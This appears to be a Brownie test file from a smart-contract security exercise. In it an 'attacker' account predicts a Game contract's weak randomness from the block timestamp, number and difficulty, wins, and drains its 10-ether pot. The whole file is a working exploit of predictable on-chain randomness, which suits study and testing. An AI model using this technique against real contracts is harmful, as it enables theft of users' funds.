from brownie import accounts, Game, chain
from eth_abi.packed import encode_packed
from brownie.convert import to_uint
from web3 import Web3

def test_weak_rand_1():
    dep = accounts[0]
    attacker = accounts[1]

    INITIAL_BAL = attacker.balance()
    GAME_POT = 10e18

    game = Game.deploy({'from': dep, 'value': GAME_POT})

    chain.mine()

    game.play(
        to_uint(Web3.solidityKeccak(['bytes32'], 
                                    
            [encode_packed(['(uint,uint,uint)'],
                       
                [((chain[-1].timestamp), 
          
                    (chain[-1].number+1), 

                chain[-1].difficulty)]
            )]
        ))

        ,{'from':attacker})

    assert(game.balance() == 0)
    assert(attacker.balance() == GAME_POT + INITIAL_BAL)
